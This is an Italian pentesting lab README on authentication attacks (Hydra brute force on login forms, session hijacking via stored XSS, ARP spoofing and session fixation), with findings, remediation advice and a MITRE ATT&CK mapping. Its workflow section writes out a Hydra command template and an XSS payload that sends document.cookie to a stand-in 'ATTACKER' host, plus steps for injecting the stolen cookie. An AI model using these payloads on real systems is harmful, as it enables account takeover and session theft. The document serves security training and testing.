# Auth Attacks - Autenticazione e Gestione delle Sessioni

> - **Fase:** Web Attack - Authentication & Session Management Testing
> - **Visibilita:** Alta (brute force genera molte richieste login) / Media (XSS per session hijacking) / Alta (ARP spoofing su LAN)
> - **Prerequisiti:** Endpoint di login identificato, form e parametri analizzati con Burp Suite, wordlist disponibile
> - **Output:** Finding WEB-009 (Brute Force), WEB-010 (Session Hijacking), proof of concept di impersonazione utente

---

## Introduzione

La compromissione dell'autenticazione permette di impersonare utenti legittimi senza conoscere le loro credenziali, ottenendo l'accesso a dati e funzionalita riservate. Questa categoria copre l'OWASP A07:2021 (Identification and Authentication Failures) e l'A01:2021 (Broken Access Control) nella sua componente di gestione delle sessioni.

La distinzione fondamentale tra le due tecniche documentate:

- **Brute Force (WEB-009):** l'attacco avviene **prima** del login. L'obiettivo e indovinare la password corretta provando sistematicamente le combinazioni di una wordlist. Richiede che il form di login sia esposto e privo di protezioni (Rate Limiting, Account Lockout, CAPTCHA).

- **Session Hijacking (WEB-010):** l'attacco avviene **dopo** che la vittima e gia autenticata. L'obiettivo e sottrarre il Session ID (solitamente in un cookie) per impersonare la sessione senza conoscere le credenziali. Richiede un vettore di accesso al cookie: XSS, sniffing di rete, o accesso fisico al browser.

La combinazione delle due tecniche forma una kill chain completa: il brute force fornisce le credenziali, il session hijacking mantiene l'accesso anche dopo il reset della password.

---

## Struttura della cartella

```
auth-attacks/
+-- bruteforce-web/     # Hydra su form HTTP/POST - finding WEB-009
+-- session-hijacking/  # Cookie stealing, XSS, ARP spoofing - finding WEB-010
```

---

## `bruteforce-web/` - Brute Force su Form Web

**ID Finding:** `WEB-009` | **Severity:** `Alto` | **CVSS v3.1:** 7.5

### Contesto operativo

Il Brute Force Web usa Hydra per automatizzare i tentativi di login su form HTTP/POST. La sfida tecnica principale e configurare Hydra per distinguere un login riuscito da uno fallito, specialmente quando il server usa redirect (302) invece di messaggi di errore espliciti.

La tecnica documentata in `bruteforce-web/README.md` include:
- Analisi del form con Firefox DevTools per identificare i parametri corretti.
- Gestione dei codici HTTP 302 (Redirect) che generano falsi positivi.
- Inversione della logica: cercare la stringa di successo (`S=Logout`) invece della stringa di errore.
- Caso studio "The Laravel Wall": analisi delle difese CSRF (HTTP 419) che rendono Hydra inefficace su framework moderni, e sviluppo di uno script Python con gestione dei cookie di sessione come alternativa.

### Remediation comune

- **Rate Limiting:** non piu di 5-10 tentativi di login per IP per minuto.
- **Account Lockout temporaneo:** blocco account dopo N tentativi falliti consecutivi (con alert all'utente).
- **CAPTCHA:** sfida umana per bloccare automazioni.
- **MFA obbligatorio:** anche con password compromessa, il secondo fattore protegge l'accesso.
- **Delay progressivo:** ritardo esponenziale dopo ogni tentativo fallito (1s, 2s, 4s...).

---

## `session-hijacking/` - Session Hijacking

**ID Finding:** `WEB-010` | **Severity:** `Alto` | **CVSS v3.1:** 8.0

### Contesto operativo

Il Session Hijacking sfrutta il fatto che il protocollo HTTP e stateless: il server usa un Session ID (spesso in un cookie) per "ricordare" chi e autenticato. Chi possiede quel cookie e l'utente, indipendentemente da come lo ha ottenuto.

La tecnica documentata in `session-hijacking/README.md` copre 4 scenari:
- **Scenario A (Basic):** copia manuale del cookie da un browser all'altro (proof of concept del concetto).
- **Scenario B (XSS + Cookie Stealing):** payload XSS Stored nel Guestbook per rubare il cookie in modo automatico e inviarlo al server dell'attaccante.
- **Scenario C (ARP Spoofing + Wireshark):** posizionamento MitM sulla LAN con Ettercap per catturare il cookie in transito su traffico HTTP non cifrato.
- **Scenario D (Session Fixation):** l'attaccante impone un Session ID noto alla vittima prima del login.

Il vettore XSS (Scenario B) e il piu comune e pericoloso nel Red Teaming moderno perche non richiede accesso fisico o presenza sulla stessa rete.

### Remediation comune

- **Flag `HttpOnly` obbligatorio:** rende il cookie invisibile a JavaScript - impedisce il furto via XSS.
- **Flag `Secure` obbligatorio:** cookie trasmesso solo su HTTPS - impedisce lo sniffing su HTTP.
- **Flag `SameSite=Strict`:** impedisce l'invio del cookie su richieste cross-site.
- **Session Rotation:** rigenerare il Session ID dopo ogni login e cambio di privilegio.
- **HTTPS su tutta l'applicazione:** impedisce lo sniffing di rete (Scenario C).

---

## Flusso operativo consigliato

```
[1] Reconnaissance autenticazione
     +-- analisi form con Burp Suite (parametri, metodo, redirect)
     +-- identificare stringa di successo/errore
              |
              v
[2] Brute Force (bruteforce-web/)
     +-- hydra -l <USER> -P passlist.txt <TARGET> http-post-form "..."
     +-- se server usa JSON -> script Python con requests.Session()
              |
              v
[3] Accesso ottenuto -> verifica sessione
     +-- ispezionare cookie: ha HttpOnly? Ha Secure? Ha SameSite?
              |
              v
[4] Se HttpOnly assente -> Session Hijacking via XSS (session-hijacking/)
     +-- payload: <script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
     +-- se HTTP (non HTTPS) -> ARP spoofing + Wireshark sniffing
              |
              v
[5] Cookie ottenuto -> Injection nel browser attaccante
     +-- document.cookie = "login=<COOKIE_RUBATO>"
     +-- refresh pagina -> sessione impersonata
```

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `hydra` | Password cracking | CLI - Attiva | Brute force su protocolli di rete e form web |
| `medusa` | Password cracking | CLI - Attiva | Alternativa a Hydra, migliore su alcuni protocolli |
| `burpsuite Intruder` | Web proxy | GUI - Attiva | Brute force integrato nel proxy, con gestione CSRF |
| `python requests` | Scripting | CLI - Attiva | Brute force custom con gestione sessioni e cookie |
| `ettercap` | ARP Spoofing | GUI/CLI - Attiva | ARP poisoning per MitM su LAN |
| `wireshark` | Network sniffer | GUI - Passiva | Cattura pacchetti e filtraggio cookie HTTP |
| `xsshunter` | Blind XSS | Web SaaS | Payload OOB per confermare XSS in aree non visibili |

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Credential Access | Brute Force: Password Guessing | `T1110.001` | Attacco con Hydra su form login usando wordlist `passlist.txt` (WEB-009) |
| Credential Access | Brute Force: Password Spraying | `T1110.004` | Tentativo con password comuni (admin, 123456, test) su utenti multipli (WEB-009) |
| Credential Access | Modify Authentication Process | `T1556` | Analisi e bypass dei meccanismi di autenticazione del framework (Laravel Sanctum CSRF) |
| Credential Access | Steal Web Session Cookie | `T1539` | Furto del cookie `login=test%2Ftest` tramite XSS Stored (WEB-010) |
| Collection | Man-in-the-Middle: AiTM HTTPS Interception | `T1557.002` | ARP spoofing con Ettercap e cattura cookie HTTP con Wireshark (WEB-010 - Scenario C) |
| Defense Evasion | Use Alternate Authentication Material: Web Session Cookie | `T1550.004` | Iniezione del cookie rubato nel browser attaccante per impersonare la sessione (WEB-010) |
| Initial Access | Exploit Public-Facing Application | `T1190` | Sfruttamento dell'assenza di rate limiting per eseguire brute force sul form di login (WEB-009) |

---

> **Nota:** Le attivita documentate in questa sezione sono state condotte su `testphp.vulnweb.com`
> (ambiente di test Acunetix) e su applicazioni locali (Docker). Il setup di laboratorio prevedeva
> due macchine virtuali: Kali Purple (attaccante, IP: 192.168.0.110) e Windows 10 (vittima).
> Replicare queste tecniche su sistemi reali richiede autorizzazione scritta esplicita.
